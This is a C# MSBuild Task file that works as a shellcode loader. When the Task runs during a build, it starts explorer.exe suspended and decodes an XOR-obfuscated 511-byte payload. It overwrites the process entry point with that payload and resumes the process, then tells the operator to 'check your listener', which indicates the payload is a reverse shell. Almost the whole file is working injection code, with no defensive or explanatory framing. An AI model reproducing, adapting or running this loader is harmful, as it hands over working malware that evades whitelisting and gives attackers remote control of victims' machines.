using System;
using System.Runtime.InteropServices;
using System.Threading;

public class ClassExample : Microsoft.Build.Utilities.Task
{
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    [DllImport("ntdll.dll")]
    static extern int NtWriteVirtualMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int NumberOfBytesToWrite,
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("ntdll.dll")]
    static extern int NtReadVirtualMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int NumberOfBytesToRead,
        out IntPtr lpNumberOfBytesRead
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern bool NtResumeProcess(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(
        IntPtr hProcess,
        int processInformationClass,
        ref PROCESS_BASIC_INFORMATION processInformation,
        uint processInformationLength,
        ref uint returnLength
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtectEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );

    public static void Main()
    {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        bool res = CreateProcess(null, "C:\\Windows\\explorer.exe", IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);

        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;

        NtQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
        IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);

        byte[] baseAddressBytes = new byte[IntPtr.Size];
        IntPtr nRead;
        NtReadVirtualMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
        IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));

        byte[] data = new byte[0x200];
        NtReadVirtualMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);

        uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
        uint entrypointRvaOffset = e_lfanew + 0x28;
        uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);

        IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

        byte[] amit = new byte[511] { 0x06,0xb2,0x79,0x1e,0x0a,0x12,0x36,0xfa,0xfa,0xfa,0xbb,0xab,0xbb,0xaa,0xa8,0xab,0xac,0xb2,0xcb,0x28,0x9f,0xb2,0x71,0xa8,0x9a,0xb2,0x71,0xa8,0xe2,0xb2,0x71,0xa8,0xda,0xb2,0xf5,0x4d,0xb0,0xb0,0xb2,0x71,0x88,0xaa,0xb7,0xcb,0x33,0xb2,0xcb,0x3a,0x56,0xc6,0x9b,0x86,0xf8,0xd6,0xda,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0x18,0x17,0xa8,0xbb,0xab,0xb2,0x71,0xa8,0xda,0x71,0xb8,0xc6,0xb2,0xfb,0x2a,0x9c,0x7b,0x82,0xe2,0xf1,0xf8,0xf5,0x7f,0x88,0xfa,0xfa,0xfa,0x71,0x7a,0x72,0xfa,0xfa,0xfa,0xb2,0x7f,0x3a,0x8e,0x9d,0xb2,0xfb,0x2a,0x71,0xb2,0xe2,0xbe,0x71,0xba,0xda,0xaa,0xb3,0xfb,0x2a,0x19,0xac,0xb7,0xcb,0x33,0xb2,0x05,0x33,0xbb,0x71,0xce,0x72,0xb2,0xfb,0x2c,0xb2,0xcb,0x3a,0x56,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0xc2,0x1a,0x8f,0x0b,0xb6,0xf9,0xb6,0xde,0xf2,0xbf,0xc3,0x2b,0x8f,0x22,0xa2,0xbe,0x71,0xba,0xde,0xb3,0xfb,0x2a,0x9c,0xbb,0x71,0xf6,0xb2,0xbe,0x71,0xba,0xe6,0xb3,0xfb,0x2a,0xbb,0x71,0xfe,0x72,0xbb,0xa2,0xb2,0xfb,0x2a,0xbb,0xa2,0xa4,0xa3,0xa0,0xbb,0xa2,0xbb,0xa3,0xbb,0xa0,0xb2,0x79,0x16,0xda,0xbb,0xa8,0x05,0x1a,0xa2,0xbb,0xa3,0xa0,0xb2,0x71,0xe8,0x13,0xb1,0x05,0x05,0x05,0xa7,0xb3,0x44,0x8d,0x89,0xc8,0xa5,0xc9,0xc8,0xfa,0xfa,0xbb,0xac,0xb3,0x73,0x1c,0xb2,0x7b,0x16,0x5a,0xfb,0xfa,0xfa,0xb3,0x73,0x1f,0xb3,0x46,0xf8,0xfa,0xfb,0x41,0x3a,0x52,0xd7,0x2e,0xbb,0xae,0xb3,0x73,0x1e,0xb6,0x73,0x0b,0xbb,0x40,0xb6,0x8d,0xdc,0xfd,0x05,0x2f,0xb6,0x73,0x10,0x92,0xfb,0xfb,0xfa,0xfa,0xa3,0xbb,0x40,0xd3,0x7a,0x91,0xfa,0x05,0x2f,0x90,0xf0,0xbb,0xa4,0xaa,0xaa,0xb7,0xcb,0x33,0xb7,0xcb,0x3a,0xb2,0x05,0x3a,0xb2,0x73,0x38,0xb2,0x05,0x3a,0xb2,0x73,0x3b,0xbb,0x40,0x10,0xf5,0x25,0x1a,0x05,0x2f,0xb2,0x73,0x3d,0x90,0xea,0xbb,0xa2,0xb6,0x73,0x18,0xb2,0x73,0x03,0xbb,0x40,0x63,0x5f,0x8e,0x9b,0x05,0x2f,0x7f,0x3a,0x8e,0xf0,0xb3,0x05,0x34,0x8f,0x1f,0x12,0x69,0xfa,0xfa,0xfa,0xb2,0x79,0x16,0xea,0xb2,0x73,0x18,0xb7,0xcb,0x33,0x90,0xfe,0xbb,0xa2,0xb2,0x73,0x03,0xbb,0x40,0xf8,0x23,0x32,0xa5,0x05,0x2f,0x79,0x02,0xfa,0x84,0xaf,0xb2,0x79,0x3e,0xda,0xa4,0x73,0x0c,0x90,0xba,0xbb,0xa3,0x92,0xfa,0xea,0xfa,0xfa,0xbb,0xa2,0xb2,0x73,0x08,0xb2,0xcb,0x33,0xbb,0x40,0xa2,0x5e,0xa9,0x1f,0x05,0x2f,0xb2,0x73,0x39,0xb3,0x73,0x3d,0xb7,0xcb,0x33,0xb3,0x73,0x0a,0xb2,0x73,0x20,0xb2,0x73,0x03,0xbb,0x40,0xf8,0x23,0x32,0xa5,0x05,0x2f,0x79,0x02,0xfa,0x87,0xd2,0xa2,0xbb,0xad,0xa3,0x92,0xfa,0xba,0xfa,0xfa,0xbb,0xa2,0x90,0xfa,0xa0,0xbb,0x40,0xf1,0xd5,0xf5,0xca,0x05,0x2f,0xad,0xa3,0xbb,0x40,0x8f,0x94,0xb7,0x9b,0x05,0x2f,0xb3,0x05,0x34,0x13,0xc6,0x05,0x05,0x05,0xb2,0xfb,0x39,0xb2,0xd3,0x3c,0xb2,0x7f,0x0c,0x8f,0x4e,0xbb,0x05,0x1d,0xa2,0x90,0xfa,0xa3,0x41,0x1a,0xe7,0xd0,0xf0,0xbb,0x73,0x20,0x05,0x2f};

        for (int i = 0; i < amit.Length; i++)
        {
            amit[i] = (byte)((uint)amit[i] ^ 0xfa);
        }

        // Change memory protection before writing
        uint oldProtect;
        bool protectResult = VirtualProtectEx(hProcess, entrypointAddress, (uint)amit.Length, 0x40, out oldProtect); // PAGE_EXECUTE_READWRITE
        if (!protectResult)
        {
            Console.WriteLine("Failed to change memory protection!");
            return;
        }

        // Perform the memory write
        IntPtr bytesWritten;
        int writeStatus = NtWriteVirtualMemory(hProcess, entrypointAddress, amit, amit.Length, out bytesWritten);
        Console.WriteLine("NtWriteVirtualMemory status: " + writeStatus + ", bytes written: " + bytesWritten);
        if (writeStatus != 0)
        {
            Console.WriteLine("Error writing memory!");
            return;
        }

        // Restore original protection
        VirtualProtectEx(hProcess, entrypointAddress, (uint)amit.Length, oldProtect, out oldProtect);

        // Resume the process
        bool resumeStatus = NtResumeProcess(pi.hProcess);
        Console.WriteLine("NtResumeProcess status: " + resumeStatus);
        if (!resumeStatus)
        {
            Console.WriteLine("Error resuming process!");
            return;
        }

        Console.WriteLine("Boom! Check your listener.");
    }

    public override bool Execute()
    {
        Main();
        return true;
    }
}
